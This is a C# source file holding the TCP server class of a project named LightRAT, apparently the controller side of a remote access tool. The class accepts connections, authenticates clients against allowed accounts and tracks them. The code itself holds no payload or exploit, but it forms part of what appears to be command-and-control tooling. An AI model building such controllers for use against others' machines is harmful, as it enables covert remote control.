using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using LightRAT.Data;
using System.Collections.Generic;
using LightRAT.Network.Packets;

namespace LightRAT.Network
{
    public class Server : IDisposable
    {
        public IPEndPoint ServerEndPoint { get; set; }
        public Socket InternalSocket { get; } = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public ConcurrentDictionary<string, Client> ConnectedClients { get; private set; } 
                                                                     = new ConcurrentDictionary<string, Client>();
        public List<Account> AllowedAccounts { get; private set; } = new List<Account>();
        public bool IsDisposed { get; private set; }

        public event EventHandler<ReceivePacketArgs> OnClientPacketReceive;
        public event EventHandler<ClientStateChangeArgs> OnClientDisconnect;
        public event EventHandler<ClientStateChangeArgs> OnClientConnect;

        public Server(string ip, int port, Account account)
        {
            ServerEndPoint = new IPEndPoint(IPAddress.Parse(ip), port);
            AllowedAccounts.Add(account);
        }

        public void Start()
        {
            try
            {
                InternalSocket.Bind(ServerEndPoint);
                InternalSocket.Listen(500);
                InternalSocket.BeginAccept(EndAccepting, null);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == (int)SocketError.AddressAlreadyInUse)
                    throw new InvalidOperationException("The selected port is already used by another process");

               throw new NotSupportedException("oops unexpected error was thrown please report this issue to the developer.");
            }  
        }
        private void EndAccepting(IAsyncResult result)
        {
            var client = new Client(InternalSocket.EndAccept(result));
            client.StartReceive();
            InternalSocket.BeginAccept(EndAccepting, null);
        }

        public void AddClient(Client client)
        {
            client.OnPacketReceive += Client_OnPacketReceive;
            client.OnDisconnect += Client_OnDisconnect;
            ConnectedClients.TryAdd(client.NetworkId, client);
            OnClientConnect?.Invoke(this, new ClientStateChangeArgs(client.NetworkId, client));
        }
        public void RemoveClient(Client client)
        {
            client.OnPacketReceive -= Client_OnPacketReceive;
            client.OnDisconnect -= Client_OnDisconnect;

            // if the client was added we will remove it
            if (client.NetworkId != null)
            {
                ConnectedClients.TryRemove(client.NetworkId, out client);
                OnClientDisconnect?.Invoke(this, new ClientStateChangeArgs(client.NetworkId, client));
            }

            client.Dispose();
        }

        private void Client_OnPacketReceive(object sender, ReceivePacketArgs e)
        {
            var client = (Client)sender;
            if (e.Packet is AuthenticationPacket)
            {
                var account = ((AuthenticationPacket)e.Packet).Account;

                if (AllowedAccounts.Contains(account))
                {
                    IPacket packet = new InformationPacket();
                    packet.Execute(client);
                }
                else
                {
                    RemoveClient(client);
                }
            }
            else if (e.Packet is InformationPacket)
            {
                var info = ((InformationPacket)e.Packet);
                client.NetworkId = info.NetworkId;
                AddClient(client);
                OnClientConnect?.Invoke(this, new ClientStateChangeArgs(client.NetworkId, client, info));
            }
            else
                OnClientPacketReceive?.Invoke(this, e);
        }
        private void Client_OnDisconnect(object sender, System.EventArgs e) => RemoveClient((Client)sender);

        public void Dispose()
        {
            if (!IsDisposed)
            {
                ServerEndPoint = null;
                InternalSocket.Disconnect(false);
                InternalSocket.Shutdown(SocketShutdown.Both);
                InternalSocket.Dispose();

                foreach (var client in ConnectedClients)
                    RemoveClient(client.Value);

                AllowedAccounts.RemoveRange(0, AllowedAccounts.Count);

                AllowedAccounts = null;
                ConnectedClients = null;
                IsDisposed = true;
            }
        }
    }
}
